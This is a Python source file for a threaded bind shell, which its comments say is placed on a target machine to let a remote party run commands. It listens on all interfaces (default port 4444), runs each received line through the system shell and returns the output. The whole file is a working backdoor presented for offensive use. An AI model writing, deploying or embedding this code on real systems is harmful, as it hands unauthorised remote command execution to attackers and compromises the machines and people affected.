#this python bind shell is placed on a target machine to allow a remote connection that can execute commands as the user running the script.
#This implements threading to allow multiple connections and prevent having to restart the script if the connection is closed for any reason.

import socket
import subprocess
import click
from threading import Thread

#function to execute a command
def run_cmd(cmd):
    output = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    return output.stdout

#receive input from external machine as chunks and convert to a string that can be executed as a command
#close down the connection if exit is entered
def handle_input(client_socket):
    while True:
        #collect all chunks
        chunks = []
        chunk = client_socket.recv(2048)
        chunks.append(chunk)
        while len(chunk) != 0 and chr(chunk[-1]) != '\n':
            chunk = client_socket.recv(2048)
            chunks.append(chunk)

        #convert chunks to executable command, strip new line character
        cmd = (b''.join(chunks)).decode()[:-1]
        
        #close the session if exit command is read
        if cmd.lower() == 'exit':
            client_socket.close()
            break

        #execute converted command on the system
        output = run_cmd(cmd)
        #send output to remote system
        client_socket.sendall(output)

#arg definitions
@click.command()
@click.option('--port', '-p', default=4444)
def main(port):
    #setup listener for connection
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0', port))
    s.listen(4)

    #execute the bind shell as a threaded subprocess
    while True:
        client_socket, _ = s.accept()
        t = Thread(target=handle_input, args=(client_socket, ))
        t.start()

if __name__ == '__main__':
    main()

